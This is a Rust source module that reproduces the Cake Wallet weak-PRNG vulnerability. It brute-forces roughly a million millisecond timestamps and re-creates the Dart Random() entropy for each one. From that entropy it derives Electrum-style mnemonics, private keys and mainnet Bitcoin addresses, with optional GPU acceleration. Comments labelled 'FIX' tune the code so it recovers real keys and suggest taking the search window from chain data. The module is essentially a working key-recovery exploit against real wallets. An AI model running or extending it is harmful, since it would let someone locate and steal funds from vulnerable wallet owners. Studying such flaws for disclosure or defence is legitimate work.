use anyhow::Result;
#[cfg(feature = "gpu")]
use tracing::error;
use tracing::{info, warn};

#[cfg(feature = "gpu")]
use bs58;

#[cfg(test)]
use bip39::Mnemonic;
#[cfg(test)]
use bitcoin::bip32::{DerivationPath, Xpriv};
#[cfg(test)]
use bitcoin::secp256k1::Secp256k1;
#[cfg(test)]
use bitcoin::{Address, Network};
#[cfg(test)]
use std::str::FromStr;

/// Simulates the Cake Wallet vulnerability.
///
/// The vulnerability: `DateTime.now().microsecondsSinceEpoch` was used as seed
/// for Dart's `Random()`, which internally runs xorshift128+ initialized via
/// SplitMix64. On real Android/iOS devices the microsecond timer typically has
/// only millisecond precision, collapsing the effective entropy to ~20 bits
/// within any given 17-minute window (1 048 576 ms).
///
/// `limit` controls how many millisecond timestamps to scan, defaulting to
/// 2^20 (covering ~17 minutes from the epoch start_ms below).
pub fn run(limit: Option<u32>) -> Result<()> {
    info!("Reproducing Cake Wallet Vulnerability (Weak PRNG)...");

    let max_steps = limit.unwrap_or(1 << 20);

    // A representative start point. In production use the known wallet creation
    // window from chain data or published CVE details.
    // Milliseconds since Unix epoch for 2021-01-01 00:00:00 UTC:
    let start_ms: u64 = 1_609_459_200_000;

    info!(
        "Scanning {} timestamps starting at {} ms (epoch)",
        max_steps, start_ms
    );

    #[cfg(feature = "gpu")]
    match crate::scans::gpu_solver::GpuSolver::new() {
        Ok(solver) => {
            info!("GPU ACCELERATION enabled");
            return run_gpu(solver, start_ms, max_steps);
        }
        Err(e) => {
            error!("Failed to initialize GPU solver: {}", e);
            warn!("Falling back to CPU...");
        }
    }

    #[cfg(not(feature = "gpu"))]
    warn!("GPU feature disabled — running on CPU (slow)...");

    run_cpu(start_ms, max_steps)
}

#[cfg(feature = "gpu")]
fn run_gpu(
    solver: crate::scans::gpu_solver::GpuSolver,
    start_ms: u64,
    max_steps: u32,
) -> Result<()> {
    // FIX: convert each millisecond timestamp to the corresponding microsecond
    // seed that Dart Random() would receive, then derive entropy via Dart PRNG.
    // Previously the code used sequential entropy bytes 0..max_steps with no
    // connection to the actual Dart PRNG — that can never recover real keys.
    let mut batch: Vec<[u8; 16]> = Vec::with_capacity(1024);

    for step in 0..max_steps {
        // Dart received DateTime.now().microsecondsSinceEpoch = ms * 1000
        let timestamp_us: u64 = (start_ms + step as u64) * 1_000;

        // Generate entropy exactly as Dart Random(timestamp_us) would
        let entropy = super::prng::generate_dart_entropy(timestamp_us);

        batch.push(entropy);

        if batch.len() >= 1024 || step == max_steps - 1 {
            // purpose=0 → Electrum derivation (Cake Wallet used m/0'/0/0 Electrum)
            if let Ok(addresses) = solver.compute_batch(&batch, 0) {
                for addr in addresses.iter() {
                    let addr_str = bs58::encode(addr).into_string();
                    info!("ADDRESS: {}", addr_str);
                }
            }
            batch.clear();
        }

        if (step + 1) % 10_000 == 0 {
            info!(
                "Progress: {}/{} ({:.1}%)",
                step + 1,
                max_steps,
                100.0 * (step + 1) as f64 / max_steps as f64
            );
        }
    }

    info!("GPU scan complete! {} timestamps generated.", max_steps);
    Ok(())
}

fn run_cpu(start_ms: u64, max_steps: u32) -> Result<()> {
    use crate::utils::electrum;
    use bip39::Mnemonic;
    use bitcoin::bip32::{DerivationPath, Xpriv};
    use bitcoin::secp256k1::Secp256k1;
    use bitcoin::{Address, Network};
    use std::str::FromStr;

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;
    // Cake Wallet Electrum derivation path
    let path = DerivationPath::from_str("m/0'/0/0")?;

    info!("Starting CPU scan...");

    for step in 0..max_steps {
        // FIX: convert millisecond offset to microsecond timestamp
        let timestamp_us: u64 = (start_ms + step as u64) * 1_000;

        // FIX: use real Dart PRNG to derive entropy from this timestamp.
        // Previously used (i as u32).to_be_bytes() padded with zeros —
        // completely unrelated to actual Dart Random() output.
        let entropy = super::prng::generate_dart_entropy(timestamp_us);

        let mnemonic = Mnemonic::from_entropy(&entropy)?;
        let mnemonic_str = mnemonic.to_string();

        // Electrum seed derivation (Cake Wallet uses "electrum" PBKDF2 salt)
        let seed_val = electrum::mnemonic_to_seed(&mnemonic_str);

        let root = Xpriv::new_master(network, &seed_val)?;
        let child = root.derive_priv(&secp, &path)?;
        let pubkey = child.to_keypair(&secp).public_key();

        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
        let address_segwit = Address::p2wpkh(&compressed_pubkey, network);
        let address_legacy = Address::p2pkh(compressed_pubkey, network);

        info!("ts={} ADDRESS_SEGWIT: {}", timestamp_us, address_segwit);
        info!("ts={} ADDRESS_LEGACY: {}", timestamp_us, address_legacy);

        if (step + 1) % 1_000 == 0 {
            info!(
                "Progress: {}/{} ({:.1}%)",
                step + 1,
                max_steps,
                100.0 * (step + 1) as f64 / max_steps as f64
            );
        }
    }

    info!("CPU scan complete.");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify that the Dart PRNG produces a valid, deterministic SegWit address
    /// from a known timestamp.
    #[test]
    fn test_dart_prng_address_derivation() {
        use crate::utils::electrum;

        let timestamp_us = 1_609_459_200_000_000u64; // 2021-01-01 00:00:00.000000 UTC

        // Dart entropy from correct xorshift128+ with SplitMix64 init
        let entropy = super::prng::generate_dart_entropy(timestamp_us);

        let mnemonic = Mnemonic::from_entropy(&entropy).unwrap();
        let mnemonic_str = mnemonic.to_string();
        let seed = electrum::mnemonic_to_seed(&mnemonic_str);

        let network = Network::Bitcoin;
        let secp = Secp256k1::new();
        let root = Xpriv::new_master(network, &seed).unwrap();

        let path = DerivationPath::from_str("m/0'/0/0").unwrap();
        let child = root.derive_priv(&secp, &path).unwrap();
        let pubkey = child.to_keypair(&secp).public_key();
        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
        let address = Address::p2wpkh(&compressed_pubkey, network);

        assert!(address.to_string().starts_with("bc1q"),
            "Expected P2WPKH address, got: {}", address);
    }

    #[test]
    #[cfg(feature = "gpu")]
    fn test_base58_address_encoding() {
        let binary_addr: [u8; 25] = [
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0xa2, 0x0d, 0xcc,
        ];

        let addr_str = bs58::encode(&binary_addr).into_string();
        assert!(addr_str.starts_with("1"));
        assert!(!addr_str.starts_with("00"));
        assert!(addr_str.len() < 40);

        let base58_chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        for c in addr_str.chars() {
            assert!(base58_chars.contains(c), "Invalid Base58 char: {}", c);
        }
    }
}